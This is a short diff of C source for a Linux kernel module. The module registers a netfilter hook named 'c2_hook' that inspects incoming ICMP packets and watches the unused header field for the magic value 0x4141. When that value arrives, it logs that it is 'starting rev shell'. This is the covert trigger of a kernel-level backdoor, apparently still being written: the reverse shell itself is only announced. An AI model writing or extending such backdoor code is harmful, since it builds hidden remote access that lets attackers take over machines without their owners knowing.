@@ -16,7 +16,11 @@ static struct nf_hook_ops *nfho = NULL;
 
 static unsigned int c2_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
     struct icmphdr *pkt = (struct icmphdr *) skb_network_header(skb); //cast skb/packet struct to icmphdr
-    printk(KERN_INFO "ICMP unused: %x", pkt->un.frag.__unused);
+    uint16_t unused_header = be16_to_cpu(pkt->un.frag.__unused);
+    if (unused_header == 0x4141) {
+	printk(KERN_INFO "Got the ICMP sequence, starting rev shell\n");
+    }
+
     return NF_ACCEPT;
 }
 
